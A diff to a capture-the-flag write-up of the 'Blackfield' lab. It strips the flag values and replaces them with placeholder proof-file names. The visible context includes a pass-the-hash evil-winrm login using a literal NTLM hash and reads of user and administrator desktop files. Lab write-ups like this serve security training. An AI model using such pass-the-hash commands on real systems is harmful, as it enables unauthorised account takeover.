@@ -1,7 +1,7 @@
 ---
 title: Blackfield
 slug: Blackfield
-tags: [Windows, ASREPRoasting, Vulnerability Research]
+tags: [ASREPRoasting, Vulnerability Research]
 ---
 ## Executive Summary
 
@@ -215,8 +215,7 @@ Let’s just quickly check if NTLM hash for `svc_backup` works using crackmape
 $ evil-winrm -i 10.129.229.17 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
 
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> cd ../Desktop
-*Evil-WinRM* PS C:\Users\svc_backup\Desktop> cat user.txt
-3920bb317a0bef51027e2852be64b543
+*Evil-WinRM* PS C:\Users\svc_backup\Desktop> cat local-proof.txt
 ```
 ## Privilege Escalation Path
 
@@ -369,8 +368,7 @@ Warning: Remote path completions is disabled due to ruby limitation: quoting_det
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                         
 Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
-4375a629c7c67c8e29db269060c955cb
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\privileged-proof.txt
 ```
 
 ---
